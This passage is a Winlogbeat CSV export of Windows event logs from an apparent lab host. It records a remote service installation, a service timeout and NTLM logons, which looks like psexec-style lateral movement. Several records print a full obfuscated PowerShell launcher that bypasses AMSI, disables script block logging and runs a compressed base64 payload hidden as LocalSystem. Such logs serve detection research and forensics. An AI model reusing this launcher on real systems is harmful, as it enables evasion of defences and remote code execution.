hSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6168,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:44.497","-XkLBIQByII7dpeEXg2S",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",7009,"Oct 23, 2022 @ 16:52:46.207","-",event,"-","Service Control Manager","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",error,"A timeout was reached (30000 milliseconds) while waiting for the JyNkRQKOokaEPAYC service to connect.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,System,Manager,"-","-",4D004B004A00720069004300580054000000,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",30000,"-","-","-","-",JyNkRQKOokaEPAYC,"-","-","-","-","-","-","-","-","-","-",7009,Classic,"-","-","-","-","-","-",640,"6,444","{555908d1-a6d7-4695-8e1e-26931d2012f4}","Service Control Manager",5657,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:44.466","-HkLBIQByII7dpeEXg2S",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",7045,"Oct 23, 2022 @ 16:52:46.207","-",event,"-","Service Control Manager","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A service was installed in the system.

Service Name:  JyNkRQKOokaEPAYC
Service File Name:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
Service Type:  user mode service
Service Start Type:  demand start
Service Account:  LocalSystem","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,System,Manager,LocalSystem,"-","-","-","-","-","-","-","-","-","%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""","-","-","-","-","-","-","-","-","-","-","-","-","-",JyNkRQKOokaEPAYC,"user mode service","demand start","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",7045,Classic,"-","-","-","-","-","-",640,"6,444","{555908d1-a6d7-4695-8e1e-26931d2012f4}","Service Control Manager",5656,"-",MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,User,"-"
"Oct 23, 2022 @ 16:52:44.168",9nkLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:52:46.207","Oct 23, 2022 @ 16:52:44.813",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0xF8CAFA

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",vagrant,"-","-","-",MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,vagrant,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-",MANAGER,0xf8cafa,vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0xf8cafa,"-",Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31187,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:44.168",93kLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:52:46.207","Oct 23, 2022 @ 16:52:44.816",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0xF8CAFA
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	WORKSTATION
	Source Network Address:	192.168.100.10
	Source Port:		45355

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
